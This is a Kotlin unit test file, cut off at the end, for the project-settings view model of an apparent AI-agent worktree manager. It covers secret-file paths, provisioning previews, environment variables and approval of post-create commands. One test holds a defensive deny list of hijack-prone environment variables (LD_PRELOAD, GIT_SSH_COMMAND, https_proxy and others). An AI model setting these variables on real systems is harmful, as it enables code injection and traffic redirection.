package app.luxion.shogunai.ui.projectconfig

import app.luxion.shogunai.domain.model.AgentLaunchConfig
import app.luxion.shogunai.domain.FakeProjectRepository
import app.luxion.shogunai.domain.FakeRepositoryProvisioningSource
import app.luxion.shogunai.domain.FakeRepositoryTrust
import app.luxion.shogunai.domain.model.EnvironmentDeclaration
import app.luxion.shogunai.domain.model.GradleProvider
import app.luxion.shogunai.domain.model.Project
import app.luxion.shogunai.domain.model.ProjectConfig
import app.luxion.shogunai.domain.model.RepositoryApprovalSubject
import app.luxion.shogunai.domain.model.RepositoryConfigIssue
import app.luxion.shogunai.domain.model.RepositoryProviders
import app.luxion.shogunai.domain.model.RepositoryProvisioning
import app.luxion.shogunai.domain.model.WorktreeError
import app.luxion.shogunai.domain.model.XcodeProvider
import app.luxion.shogunai.domain.model.parseEnvironmentVariable
import app.luxion.shogunai.ui.i18n.EnglishStrings
import kotlinx.coroutines.runBlocking
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertIs
import kotlin.test.assertFalse
import kotlin.test.assertNull
import kotlin.test.assertTrue

class ProjectConfigViewModelTest {

    private val basePath = "/home/dev/projects/main-repo"
    private var provisioningSource = FakeRepositoryProvisioningSource()
    private val projectRepository = FakeProjectRepository()

    private fun projectWith(
        secretFiles: List<String> = emptyList(),
        worktreesRoot: String = "/home/dev/projects",
        mainBranch: String? = null,
    ) = Project(
        id = "p",
        name = "Project",
        config = ProjectConfig(
            baseRepositoryPath = "/home/dev/projects/main-repo",
            worktreesRoot = worktreesRoot,
            secretFiles = secretFiles,
            mainBranch = mainBranch,
        ),
    )

    private fun viewModelFor(project: Project?, trust: FakeRepositoryTrust = FakeRepositoryTrust()) =
        ProjectConfigViewModel(projectRepository, provisioningSource, project, trust = trust)

    @Test
    fun `the saved name stays while the name field is edited`() {
        val viewModel = viewModelFor(projectWith())

        viewModel.name = "other-name"

        assertEquals("Project", viewModel.savedName)
        assertEquals("Settings · Project", settingsTitle(EnglishStrings, isNewProject = false, savedName = viewModel.savedName))
    }

    @Test
    fun `adding a project keeps the add title`() {
        assertEquals("Add project", settingsTitle(EnglishStrings, isNewProject = true, savedName = ""))
    }

    @Test
    fun `linked patterns are listed from the config file and marked as linked`() {
        val declared = RepositoryProvisioning(
            copyPatterns = listOf("local.properties"),
            linkPatterns = listOf("node_modules"),
            worktreeIncludePatterns = listOf(".env"),
        )

        assertEquals(
            listOf(
                "local.properties" to ".shogunai.json",
                "node_modules" to ".shogunai.json · linked",
                ".env" to ".worktreeinclude",
            ),
            provisioningRows(declared, emptyList(), EnglishStrings),
        )
    }

    @Test
    fun `a repository with only commands has no rows and an empty one has neither`() {
        val onlyCommands = RepositoryProvisioning(postCreateCommands = listOf(listOf("npm", "install"), listOf("npm", "run", "setup")))

        assertTrue(provisioningRows(onlyCommands, emptyList(), EnglishStrings).isEmpty())
        assertEquals(
            "2 commands run after creation; see Repository configuration below.",
            EnglishStrings.postCreationCommandsNote(onlyCommands.postCreateCommands.size),
        )
        assertTrue(provisioningRows(null, emptyList(), EnglishStrings).isEmpty())
    }

    private fun viewModelInspecting(project: Project?, vararg repositories: String) = ProjectConfigViewModel(
        projectRepository,
        provisioningSource,
        project,
        inspectRepository = { folder ->
            val topLevel = repositories.firstOrNull { folder == it || folder.startsWith("$it/") }
            if (topLevel == null) {
                Result.failure(WorktreeError.RepositoryNotFound(folder))
            } else {
                Result.success(RepositoryInspection(topLevel, "main"))
            }
        },
    )

    @Test
    fun `relative secret files follow the base repository when it moves`() {
        val viewModel = viewModelFor(projectWith(listOf("local.properties", "app/secrets.properties")))

        viewModel.baseRepositoryPath = "/home/dev/moved/main-repo"
        val saved = viewModel.save().getOrThrow()

        assertEquals("/home/dev/moved/main-repo", saved.config.baseRepositoryPath)
        assertEquals(listOf("local.properties", "app/secrets.properties"), saved.config.secretFiles)
        assertEquals("/home/dev/moved/main-repo/local.properties", saved.config.baseSecretPath("local.properties"))
    }

    @Test
    fun `absolute secret files inside the old base repository are rebased when it moves`() {
        val viewModel = viewModelFor(
            projectWith(listOf("/home/dev/projects/main-repo/local.properties", "/home/dev/projects/main-repo/app/key.json")),
        )

        viewModel.baseRepositoryPath = "/home/dev/moved/main-repo"
        val saved = viewModel.save().getOrThrow()

        assertEquals(listOf("local.properties", "app/key.json"), saved.config.secretFiles)
    }

    @Test
    fun `absolute secret files are rebased while the base path is typed character by character`() {
        val viewModel = viewModelFor(projectWith(listOf("/home/dev/projects/main-repo/local.properties")))

        viewModel.baseRepositoryPath = ""
        "/home/dev/moved/main-repo".forEachIndexed { index, _ ->
            viewModel.baseRepositoryPath = "/home/dev/moved/main-repo".substring(0, index + 1)
        }

        assertEquals(listOf("local.properties"), viewModel.secretFiles)
    }

    @Test
    fun `absolute secret files outside the base repository are kept as they are`() {
        val viewModel = viewModelFor(projectWith(listOf("/etc/shared/secrets.properties")))

        viewModel.baseRepositoryPath = "/home/dev/moved/main-repo"

        assertEquals(listOf("/etc/shared/secrets.properties"), viewModel.secretFiles)
    }

    @Test
    fun `loading a project with absolute secret files inside the base does not mark it as modified`() {
        val viewModel = viewModelFor(projectWith(listOf("/home/dev/projects/main-repo/local.properties")))

        assertEquals(listOf("local.properties"), viewModel.secretFiles)
        assertFalse(viewModel.hasUnsavedChanges)
    }

    @Test
    fun `a folder entry with a trailing separator is the same entry as without it`() {
        val viewModel = viewModelFor(projectWith(listOf("keys")))

        viewModel.addSecretFile("keys/")

        assertEquals(listOf("keys"), viewModel.secretFiles)
    }

    @Test
    fun `adding an absolute folder inside the base repository stores it relative without the separator`() {
        val viewModel = viewModelFor(projectWith(emptyList()))

        viewModel.addSecretFile("/home/dev/projects/main-repo/config/keys/")

        assertEquals(listOf("config/keys"), viewModel.secretFiles)
    }

    @Test
    fun `folder entries follow the base repository when it moves`() {
        val viewModel = viewModelFor(projectWith(listOf("/home/dev/projects/main-repo/keys", "/etc/shared/keys")))

        viewModel.baseRepositoryPath = "/home/dev/moved/main-repo"
        val saved = viewModel.save().getOrThrow()

        assertEquals(listOf("keys", "/etc/shared/keys"), saved.config.secretFiles)
    }

    @Test
    fun `adding an absolute path inside the base repository stores it as relative`() {
        val viewModel = viewModelFor(projectWith(emptyList()))

        viewModel.addSecretFile("/home/dev/projects/main-repo/app/local.properties")

        assertEquals(listOf("app/local.properties"), viewModel.secretFiles)
    }

    @Test
    fun `worktrees root next to the base repository follows it when it moves`() {
        val viewModel = viewModelFor(projectWith(worktreesRoot = "/home/dev/projects"))

        viewModel.baseRepositoryPath = "/home/dev/moved/main-repo"

        assertEquals("/home/dev/moved", viewModel.worktreesRoot)
    }

    @Test
    fun `worktrees root inside the base repository follows it when it moves`() {
        val viewModel = viewModelFor(projectWith(worktreesRoot = "/home/dev/projects/main-repo/.worktrees"))

        viewModel.baseRepositoryPath = "/home/dev/moved/main-repo"

        assertEquals("/home/dev/moved/main-repo/.worktrees", viewModel.worktreesRoot)
    }

    @Test
    fun `worktrees root follows the base path while it is typed character by character`() {
        val viewModel = viewModelFor(projectWith(worktreesRoot = "/home/dev/projects/worktrees"))
        val newBase = "/home/dev/moved/main-repo"

        viewModel.baseRepositoryPath = ""
        newBase.indices.forEach { viewModel.baseRepositoryPath = newBase.substring(0, it + 1) }

        assertEquals("/home/dev/moved/worktrees", viewModel.worktreesRoot)
    }

    @Test
    fun `worktrees root unrelated to the base repository stays when it moves`() {
        val viewModel = viewModelFor(projectWith(worktreesRoot = "/mnt/fast-disk/worktrees"))

        viewModel.baseRepositoryPath = "/home/dev/moved/main-repo"

        assertEquals("/mnt/fast-disk/worktrees", viewModel.worktreesRoot)
    }

    @Test
    fun `worktrees root edited by hand stays when the base repository moves`() {
        val viewModel = viewModelFor(projectWith(worktreesRoot = "/home/dev/projects"))

        viewModel.worktreesRoot = "/home/dev/custom"
        viewModel.baseRepositoryPath = "/home/dev/moved/main-repo"

        assertEquals("/home/dev/custom", viewModel.worktreesRoot)
    }

    @Test
    fun `adding a secret file that is already listed leaves the list unchanged`() {
        val viewModel = viewModelFor(projectWith(listOf("local.properties")))

        viewModel.addSecretFile("local.properties")

        assertEquals(listOf("local.properties"), viewModel.secretFiles)
    }

    @Test
    fun `an untouched form has no unsaved changes`() {
        assertFalse(viewModelFor(projectWith()).hasUnsavedChanges)
        assertFalse(viewModelFor(null).hasUnsavedChanges)
    }

    @Test
    fun `editing a field marks the form as having unsaved changes`() {
        val viewModel = viewModelFor(projectWith())

        viewModel.name = "Renamed"

        assertTrue(viewModel.hasUnsavedChanges)
    }

    @Test
    fun `a new project has no main branch by default`() {
        val viewModel = viewModelFor(null).apply {
            name = "Project"
            baseRepositoryPath = "/home/dev/projects/main-repo"
        }

        assertNull(viewModel.save().getOrThrow().config.mainBranch)
    }

    @Test
    fun `the main branch is saved trimmed`() {
        val viewModel = viewModelFor(projectWith())

        viewModel.mainBranch = "  develop "

        assertEquals("develop", viewModel.save().getOrThrow().config.mainBranch)
    }

    @Test
    fun `a blank main branch is saved as not set`() {
        val viewModel = viewModelFor(projectWith(mainBranch = "develop"))

        viewModel.mainBranch = "   "

        assertNull(viewModel.save().getOrThrow().config.mainBranch)
    }

    @Test
    fun `editing the main branch marks the form as having unsaved changes`() {
        val viewModel = viewModelFor(projectWith(mainBranch = "develop"))
        assertFalse(viewModel.hasUnsavedChanges)

        viewModel.mainBranch = "main"

        assertTrue(viewModel.hasUnsavedChanges)
    }

    @Test
    fun `shows the provisioning the repository declares`() {
        val declared = RepositoryProvisioning(copyPatterns = listOf("local.properties"), worktreeIncludePatterns = listOf(".env"))
        provisioningSource = FakeRepositoryProvisioningSource(byRepository = mapOf(basePath to declared))

        val viewModel = viewModelFor(projectWith())

        assertEquals(RepositoryProvisioningState.Declared(declared), viewModel.repositoryProvisioning)
    }

    @Test
    fun `shows nothing declared for a repository without provisioning files`() {
        assertEquals(RepositoryProvisioningState.None, viewModelFor(projectWith()).repositoryProvisioning)
    }

    @Test
    fun `reloads the provisioning when the base repository path settles on another repository`() = runBlocking {
        val other = RepositoryProvisioning(copyPatterns = listOf(".env*"))
        provisioningSource = FakeRepositoryProvisioningSource(byRepository = mapOf("/home/dev/projects/other-repo" to other))
        val viewModel = viewModelInspecting(projectWith(), "/home/dev/projects/other-repo")

        viewModel.baseRepositoryPath = "/home/dev/projects/other-repo"
        assertEquals(RepositoryProvisioningState.None, viewModel.repositoryProvisioning)
        viewModel.settleBaseRepositoryPath()

        assertEquals(RepositoryProvisioningState.Declared(other), viewModel.repositoryProvisioning)
    }

    @Test
    fun `fixing a typo in the base path keeps the unsaved repository edits`() = runBlocking {
        val viewModel = viewModelInspecting(projectWith(), basePath)
        viewModel.setGradleEnabled(true)
        val edited = GradleDraft(daemonMaxHeap = "4g", idleTimeoutMinutes = "30")
        viewModel.updateRepositoryDraft { it.copy(gradle = edited) }

        viewModel.baseRepositoryPath = "$basePath-typo"
        viewModel.settleBaseRepositoryPath()
        viewModel.baseRepositoryPath = basePath
        viewModel.settleBaseRepositoryPath()

        assertEquals(edited, viewModel.repositoryDraft.gradle)
        assertTrue(viewModel.hasUnsavedChanges)
        assertNull(viewModel.pendingRepositoryChange)
        assertNull(viewModel.basePathProblem)
    }

    @Test
    fun `another repository asks before discarding the unsaved repository edits`() = runBlocking {
        val other = RepositoryProvisioning(copyPatterns = listOf(".env*"))
        provisioningSource = FakeRepositoryProvisioningSource(byRepository = mapOf("/home/dev/projects/other-repo" to other))
        val viewModel = viewModelInspecting(projectWith(), basePath, "/home/dev/projects/other-repo")
        viewModel.setGradleEnabled(true)

        viewModel.baseRepositoryPath = "/home/dev/projects/other-repo"
        viewModel.settleBaseRepositoryPath()

        assertEquals("/home/dev/projects/other-repo", viewModel.pendingRepositoryChange)
        assertEquals(GradleDraft(), viewModel.repositoryDraft.gradle)
        assertIs<SaveOutcome.Invalid>(viewModel.submit())

        viewModel.confirmRepositoryChange()

        assertNull(viewModel.pendingRepositoryChange)
        assertNull(viewModel.repositoryDraft.gradle)
        assertEquals(RepositoryProvisioningState.Declared(other), viewModel.repositoryProvisioning)
    }

    @Test
    fun `declining the change puts the previous repository path back`() = runBlocking {
        val viewModel = viewModelInspecting(projectWith(), basePath, "/home/dev/projects/other-repo")
        viewModel.setGradleEnabled(true)
        viewModel.baseRepositoryPath = "/home/dev/projects/other-repo"
        viewModel.settleBaseRepositoryPath()

        viewModel.cancelRepositoryChange()

        assertEquals(basePath, viewModel.baseRepositoryPath)
        assertNull(viewModel.pendingRepositoryChange)
        assertEquals(GradleDraft(), viewModel.repositoryDraft.gradle)
    }

    @Test
    fun `another repository loads straight away when nothing is unsaved`() = runBlocking {
        val viewModel = viewModelInspecting(projectWith(), basePath, "/home/dev/projects/other-repo")

        viewModel.baseRepositoryPath = "/home/dev/projects/other-repo"
        viewModel.settleBaseRepositoryPath()

        assertNull(viewModel.pendingRepositoryChange)
    }

    @Test
    fun `a subfolder of a repository is flagged and cannot be saved`() = runBlocking {
        val viewModel = viewModelInspecting(projectWith(), basePath)

        viewModel.baseRepositoryPath = "$basePath/app"
        viewModel.settleBaseRepositoryPath()

        assertEquals(BasePathProblem.NOT_TOP_LEVEL, viewModel.basePathProblem)
        assertTrue(viewModel.isErrorVisible(ProjectConfigField.BASE_REPOSITORY_PATH))
        assertEquals(ProjectConfigField.BASE_REPOSITORY_PATH, assertIs<SaveOutcome.Invalid>(viewModel.submit()).firstInvalidField)
        assertTrue(projectRepository.list().isEmpty())
    }

    @Test
    fun `a folder that is not a repository is flagged and cannot be saved`() = runBlocking {
        val viewModel = viewModelInspecting(projectWith(), basePath)

        viewModel.baseRepositoryPath = "/home/dev/plain"
        viewModel.settleBaseRepositoryPath()

        assertEquals(BasePathProblem.NOT_A_REPOSITORY, viewModel.basePathProblem)
        assertTrue(viewModel.submit() is SaveOutcome.Invalid)
    }

    @Test
    fun `the flag disappears when the path is edited again`() = runBlocking {
        val viewModel = viewModelInspecting(projectWith(), basePath)
        viewModel.baseRepositoryPath = "/home/dev/plain"
        viewModel.settleBaseRepositoryPath()

        viewModel.baseRepositoryPath = "/home/dev/plain2"

        assertNull(viewModel.basePathProblem)
    }

    @Test
    fun `a repository another project already uses is rejected naming that project`() {
        projectRepository.save(
            Project(
                id = "other",
                name = "Other project",
                config = ProjectConfig(baseRepositoryPath = "/home/dev/projects/api", worktreesRoot = "/home/dev/projects", secretFiles = emptyList()),
            ),
        )
        val viewModel = viewModelFor(projectWith())

        viewModel.baseRepositoryPath = "/home/dev/projects/api/"

        assertEquals("Other project", viewModel.duplicateProject?.name)
        assertIs<SaveOutcome.Invalid>(viewModel.submit())
    }

    @Test
    fun `the project being edited is not a duplicate of itself`() {
        projectRepository.save(projectWith())

        assertNull(viewModelFor(projectWith()).duplicateProject)
    }

    @Test
    fun `a blank worktrees folder or agent command cannot be saved`() {
        val viewModel = viewModelFor(projectWith())

        viewModel.worktreesRoot = " "
        assertEquals(ProjectConfigField.WORKTREES_ROOT, assertIs<SaveOutcome.Invalid>(viewModel.submit()).firstInvalidField)

        viewModel.worktreesRoot = "/home/dev/projects"
        viewModel.updateAgent(0) { it.copy(command = "") }
        assertEquals(ProjectConfigField.AGENT_COMMAND, assertIs<SaveOutcome.Invalid>(viewModel.submit()).firstInvalidField)
    }

    @Test
    fun `the preview is shown again after reloading a file changed on disk`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.setGradleEnabled(true)
        viewModel.submit(previewConfirmed = true)
        viewModel.setEmulatorEnabled(true)
        provisioningSource.currentFingerprint = "fingerprint-2"
        assertIs<SaveOutcome.Failed>(viewModel.submit())

        viewModel.reloadRepositoryConfig()
        viewModel.setEmulatorEnabled(true)

        assertIs<SaveOutcome.NeedsPreview>(viewModel.submit())
    }

    @Test
    fun `reports an unreadable repository file and offers no move`() {
        provisioningSource = FakeRepositoryProvisioningSource(unreadable = setOf(basePath))

        val viewModel = viewModelFor(projectWith(listOf("local.properties")))

        assertIs<RepositoryProvisioningState.Unreadable>(viewModel.repositoryProvisioning)
        assertFalse(viewModel.canMoveLocalFilesToRepository)
        viewModel.moveLocalFilesToRepository()
        assertEquals(listOf("local.properties"), viewModel.secretFiles)
    }

    @Test
    fun `moving local files anchors the ones inside the repository and keeps the rest local`() {
        val viewModel = viewModelFor(
            projectWith(listOf("local.properties", "app/google-services.json", "/etc/keys/release.jks", "../shared/key.json")),
        )

        viewModel.moveLocalFilesToRepository()

        assertEquals(listOf("/local.properties", "/app/google-services.json"), viewModel.pendingRepositoryPatterns)
        assertEquals(listOf("/etc/keys/release.jks", "../shared/key.json"), viewModel.secretFiles)
        assertTrue(viewModel.hasUnsavedChanges)
        assertTrue(provisioningSource.addedPatterns.isEmpty(), "nothing is written before saving")
    }

    @Test
    fun `saving writes the moved patterns to the repository before the project`() {
        val viewModel = viewModelFor(projectWith(listOf("local.properties", "/etc/keys/release.jks")))
        viewModel.moveLocalFilesToRepository()

        val saved = viewModel.save().getOrThrow()

        assertEquals(listOf(basePath to listOf("/local.properties")), provisioningSource.addedPatterns)
        assertEquals(listOf("/etc/keys/release.jks"), saved.config.secretFiles)
        assertEquals(saved, projectRepository.list().single())
        assertEquals(emptyList(), viewModel.pendingRepositoryPatterns)
    }

    @Test
    fun `a failed write leaves the project unchanged`() {
        provisioningSource = FakeRepositoryProvisioningSource(failWritesFor = setOf(basePath))
        val viewModel = viewModelFor(projectWith(listOf("local.properties")))
        viewModel.moveLocalFilesToRepository()

        val result = viewModel.save()

        assertTrue(result.isFailure)
        assertTrue(projectRepository.list().isEmpty())
        assertEquals(listOf("/local.properties"), viewModel.pendingRepositoryPatterns)
    }

    @Test
    fun `nothing to move without local files inside the repository`() {
        assertFalse(viewModelFor(projectWith()).canMoveLocalFilesToRepository)
        assertFalse(viewModelFor(projectWith(listOf("/etc/keys/release.jks"))).canMoveLocalFilesToRepository)
        assertTrue(viewModelFor(projectWith(listOf("local.properties"))).canMoveLocalFilesToRepository)
    }

    @Test
    fun `saving without moving never writes to the repository`() {
        val viewModel = viewModelFor(projectWith(listOf("local.properties")))
        viewModel.name = "Renamed"

        viewModel.save().getOrThrow()

        assertTrue(provisioningSource.addedPatterns.isEmpty())
    }

    private fun newProjectViewModel(
        inspections: Map<String, RepositoryInspection> = emptyMap(),
    ) = ProjectConfigViewModel(
        projectRepository,
        provisioningSource,
        existingProject = null,
        inspectRepository = { folder ->
            inspections[folder]?.let { Result.success(it) } ?: Result.failure(WorktreeError.RepositoryNotFound(folder))
        },
    )

    @Test
    fun `an untouched new form shows no errors`() {
        val viewModel = newProjectViewModel()

        assertFalse(viewModel.isErrorVisible(ProjectConfigField.NAME))
        assertFalse(viewModel.isErrorVisible(ProjectConfigField.BASE_REPOSITORY_PATH))
    }

    @Test
    fun `emptying an edited name shows its error`() {
        val viewModel = newProjectViewModel()

        viewModel.name = "api"
        assertFalse(viewModel.isErrorVisible(ProjectConfigField.NAME))
        viewModel.name = ""

        assertTrue(viewModel.isErrorVisible(ProjectConfigField.NAME))
        assertFalse(viewModel.isErrorVisible(ProjectConfigField.BASE_REPOSITORY_PATH))
    }

    @Test
    fun `saving with errors does not save and reports the first invalid field`() {
        val viewModel = newProjectViewModel()

        val outcome = viewModel.submit()

        assertEquals(SaveOutcome.Invalid(ProjectConfigField.NAME), outcome)
        assertTrue(viewModel.isErrorVisible(ProjectConfigField.NAME))
        assertTrue(viewModel.isErrorVisible(ProjectConfigField.BASE_REPOSITORY_PATH))
        assertTrue(projectRepository.list().isEmpty())
    }

    @Test
    fun `saving a valid form saves the project`() {
        val viewModel = newProjectViewModel()
        viewModel.name = "api"
        viewModel.baseRepositoryPath = "/home/dev/projects/api"
        viewModel.worktreesRoot = "/home/dev/projects"

        val outcome = viewModel.submit()

        assertIs<SaveOutcome.Saved>(outcome)
        assertEquals(1, projectRepository.list().size)
    }

    @Test
    fun `choosing a repository prefills the name, a sibling worktrees folder and the detected main branch`() = runBlocking {
        val viewModel = newProjectViewModel(
            mapOf("/home/dev/projects/main-repo/app" to RepositoryInspection("/home/dev/projects/main-repo", "main")),
        )

        val result = viewModel.chooseFolder("/home/dev/projects/main-repo/app")

        assertTrue(result.isSuccess)
        assertTrue(viewModel.folderChosen)
        assertEquals("main-repo", viewModel.name)
        assertEquals("/home/dev/projects/main-repo", viewModel.baseRepositoryPath)
        assertEquals("/home/dev/projects/main-repo-worktrees", viewModel.worktreesRoot)
        assertEquals("main", viewModel.detectedMainBranch)
        assertEquals("", viewModel.mainBranch)
        assertFalse(viewModel.hasUnsavedChanges)
        assertFalse(viewModel.isErrorVisible(ProjectConfigField.NAME))
    }

    @Test
    fun `a folder that is not a repository is rejected and the form stays closed`() = runBlocking {
        val viewModel = newProjectViewModel()

        val result = viewModel.chooseFolder("/home/dev/projects/plain")

        assertTrue(result.isFailure)
        assertFalse(viewModel.folderChosen)
        assertEquals("/home/dev/projects/plain", viewModel.rejectedFolder)
        assertEquals("", viewModel.baseRepositoryPath)
    }

    @Test
    fun `shows the providers and environment the repository declares`() {
        val declared = RepositoryProvisioning(
            providers = RepositoryProviders(gradle = GradleProvider(daemonMaxHeap = "2g", idleTimeoutMinutes = 30)),
            environment = EnvironmentDeclaration(listOf(parseEnvironmentVariable("PORT", "\${port}")), envFile = ".env.shogunai"),
        )
        provisioningSource = FakeRepositoryProvisioningSource(byRepository = mapOf(basePath to declared))

        val viewModel = viewModelFor(projectWith())

        assertEquals(GradleDraft("2g", "30", ""), viewModel.repositoryDraft.gradle)
        assertNull(viewModel.repositoryDraft.emulator)
        assertEquals(listOf("PORT" to "\${port}"), viewModel.repositoryDraft.environment.map { it.name to it.template })
        assertEquals(".env.shogunai", viewModel.repositoryDraft.envFile)
        assertFalse(viewModel.hasUnsavedChanges)
    }

    @Test
    fun `turning a provider on and off counts as an unsaved change`() {
        val viewModel = viewModelFor(projectWith())

        viewModel.setGradleEnabled(true)
        assertTrue(viewModel.hasUnsavedChanges)
        assertEquals(GradleDraft(), viewModel.repositoryDraft.gradle)

        viewModel.setGradleEnabled(false)
        assertFalse(viewModel.hasUnsavedChanges)
    }

    @Test
    fun `invalid values are flagged and block saving`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.setGradleEnabled(true)
        viewModel.updateRepositoryDraft { it.copy(gradle = GradleDraft(daemonMaxHeap = "2 GB")) }

        val outcome = viewModel.submit()

        assertEquals(SaveOutcome.InvalidRepositoryConfig(RepositoryConfigField.GradleDaemonMaxHeap), outcome)
        assertEquals(RepositoryConfigIssue.InvalidMemorySize, viewModel.repositoryDraft.issueFor(RepositoryConfigField.GradleDaemonMaxHeap))
        assertTrue(projectRepository.list().isEmpty())
    }

    @Test
    fun `flags invalid variable names, templates, duplicates and env files`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.addEnvironmentRow()
        viewModel.addEnvironmentRow()
        val (first, second) = viewModel.repositoryDraft.environment.map { it.id }

        viewModel.updateEnvironmentRow(first, name = "1PORT", template = "x")
        viewModel.updateEnvironmentRow(second, name = "PORT", template = "\${branch}")
        viewModel.updateRepositoryDraft { it.copy(envFile = "../shared.env") }

        val draft = viewModel.repositoryDraft
        assertEquals(RepositoryConfigIssue.InvalidVariableName, draft.issueFor(RepositoryConfigField.EnvironmentName(first)))
        assertEquals(RepositoryConfigIssue.UnknownPlaceholder("branch"), draft.issueFor(RepositoryConfigField.EnvironmentTemplate(second)))
        assertEquals(RepositoryConfigIssue.EnvFileOutsideWorktree, draft.issueFor(RepositoryConfigField.EnvFile))

        viewModel.updateEnvironmentRow(first, name = "PORT")
        assertEquals(
            RepositoryConfigIssue.DuplicateVariableName,
            viewModel.repositoryDraft.issueFor(RepositoryConfigField.EnvironmentName(second)),
        )
    }

    @Test
    fun `a malformed repository file disables the section`() {
        provisioningSource = FakeRepositoryProvisioningSource(unreadable = setOf(basePath))
        val viewModel = viewModelFor(projectWith())

        viewModel.setGradleEnabled(true)
        viewModel.addEnvironmentRow()

        assertFalse(viewModel.repositoryConfigEditable)
        assertNull(viewModel.repositoryDraft.gradle)
        assertTrue(viewModel.repositoryDraft.environment.isEmpty())
        assertFalse(viewModel.hasUnsavedChanges)
    }

    @Test
    fun `the first save previews the file and nothing is saved until confirmed`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.setGradleEnabled(true)

        val outcome = viewModel.submit()

        assertIs<SaveOutcome.NeedsPreview>(outcome)
        assertTrue(provisioningSource.writtenEdits.isEmpty())
        assertTrue(projectRepository.list().isEmpty())
        assertTrue(viewModel.hasUnsavedChanges)
    }

    @Test
    fun `confirming the preview writes the repository file then saves the project`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.setGradleEnabled(true)
        viewModel.updateRepositoryDraft { it.copy(gradle = GradleDraft(daemonMaxHeap = "2g", idleTimeoutMinutes = "30")) }

        val outcome = viewModel.submit(previewConfirmed = true)

        val saved = assertIs<SaveOutcome.Saved>(outcome)
        assertTrue(saved.repositoryWritten)
        val (path, edit) = provisioningSource.writtenEdits.single()
        assertEquals(basePath, path)
        assertEquals(GradleProvider(daemonMaxHeap = "2g", idleTimeoutMinutes = 30), edit.providers.gradle)
        assertEquals(saved.project, projectRepository.list().single())
        assertFalse(viewModel.hasUnsavedChanges)
    }

    @Test
    fun `later saves in the same visit skip the preview`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.setGradleEnabled(true)
        viewModel.submit(previewConfirmed = true)

        viewModel.setEmulatorEnabled(true)

        assertIs<SaveOutcome.Saved>(viewModel.submit())
        assertEquals(2, provisioningSource.writtenEdits.size)
    }

    @Test
    fun `saving without repository changes never previews or writes the repository file`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.name = "Renamed"

        val outcome = viewModel.submit()

        assertFalse(assertIs<SaveOutcome.Saved>(outcome).repositoryWritten)
        assertTrue(provisioningSource.writtenEdits.isEmpty())
    }

    @Test
    fun `a failed repository write keeps the project unsaved and the edits`() {
        provisioningSource = FakeRepositoryProvisioningSource(failWritesFor = setOf(basePath))
        val viewModel = viewModelFor(projectWith())
        viewModel.setGradleEnabled(true)
        viewModel.name = "Renamed"

        val outcome = viewModel.submit(previewConfirmed = true)

        assertIs<SaveOutcome.Failed>(outcome)
        assertTrue(projectRepository.list().isEmpty())
        assertTrue(viewModel.hasUnsavedChanges)
        assertEquals(GradleDraft(), viewModel.repositoryDraft.gradle)
    }

    @Test
    fun `a file changed on disk is not overwritten and offers to reload`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.setGradleEnabled(true)
        provisioningSource.currentFingerprint = "fingerprint-2"

        val outcome = viewModel.submit(previewConfirmed = true)

        assertIs<WorktreeError.RepositoryConfigChanged>(assertIs<SaveOutcome.Failed>(outcome).error)
        assertTrue(viewModel.repositoryChangedOnDisk)
        assertTrue(projectRepository.list().isEmpty())

        viewModel.reloadRepositoryConfig()

        assertFalse(viewModel.repositoryChangedOnDisk)
        assertNull(viewModel.repositoryDraft.gradle)
        assertFalse(viewModel.hasUnsavedChanges)
    }

    @Test
    fun `providers hidden on this platform are kept when saving`() {
        val declared = RepositoryProvisioning(providers = RepositoryProviders(xcode = XcodeProvider(compilationCache = true)))
        provisioningSource = FakeRepositoryProvisioningSource(byRepository = mapOf(basePath to declared))
        val viewModel = ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), supportsApplePlatforms = false)
        viewModel.setGradleEnabled(true)

        viewModel.submit(previewConfirmed = true)

        assertEquals(XcodeProvider(compilationCache = true), provisioningSource.writtenEdits.single().second.providers.xcode)
        assertFalse(viewModel.showsApplePlatformProviders)
    }

    @Test
    fun `moved local files and provider changes are written together`() {
        val viewModel = viewModelFor(projectWith(listOf("local.properties")))
        viewModel.moveLocalFilesToRepository()
        viewModel.setGradleEnabled(true)

        viewModel.submit(previewConfirmed = true)

        val edit = provisioningSource.writtenEdits.single().second
        assertEquals(listOf("/local.properties"), edit.addCopyPatterns)
        assertTrue(provisioningSource.addedPatterns.isEmpty())
    }

    @Test
    fun `flags reserved variable names`() {
        val viewModel = viewModelFor(projectWith())
        viewModel.addEnvironmentRow()
        val row = viewModel.repositoryDraft.environment.single().id

        listOf("PATH", "LD_PRELOAD", "GIT_SSH_COMMAND", "XDG_CONFIG_HOME", "https_proxy").forEach { name ->
            viewModel.updateEnvironmentRow(row, name = name, template = "x")
            assertEquals(RepositoryConfigIssue.ReservedVariableName, viewModel.repositoryDraft.issueFor(RepositoryConfigField.EnvironmentName(row)), name)
        }
        viewModel.updateEnvironmentRow(row, name = "PORT", template = "x")
        assertNull(viewModel.repositoryDraft.issueFor(RepositoryConfigField.EnvironmentName(row)))
    }

    private val installCommands = listOf(listOf("npm", "install"))

    private fun declare(commands: List<List<String>>) {
        provisioningSource = FakeRepositoryProvisioningSource(
            byRepository = mapOf(basePath to RepositoryProvisioning(postCreateCommands = commands)),
        )
    }

    private fun viewModelWithCommands(trust: FakeRepositoryTrust): ProjectConfigViewModel {
        declare(installCommands)
        return ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)
    }

    private val installSubject = RepositoryApprovalSubject(installCommands)

    @Test
    fun `shows the declared commands as not approved until they are approved`() {
        val trust = FakeRepositoryTrust()
        val viewModel = viewModelWithCommands(trust)

        assertEquals(installSubject, viewModel.approvalSubject)
        assertFalse(viewModel.repositoryApproved)

        viewModel.approveRepository()

        assertTrue(viewModel.repositoryApproved)
        assertTrue(trust.isApproved(basePath, installSubject))
    }

    @Test
    fun `revoking removes the approval`() {
        val trust = FakeRepositoryTrust(mapOf(basePath to installSubject))
        val viewModel = viewModelWithCommands(trust)
        assertTrue(viewModel.repositoryApproved)

        viewModel.revokeRepositoryApproval()

        assertFalse(viewModel.repositoryApproved)
        assertFalse(trust.isApproved(basePath, installSubject))
    }

    @Test
    fun `commands changed on disk show as not approved`() {
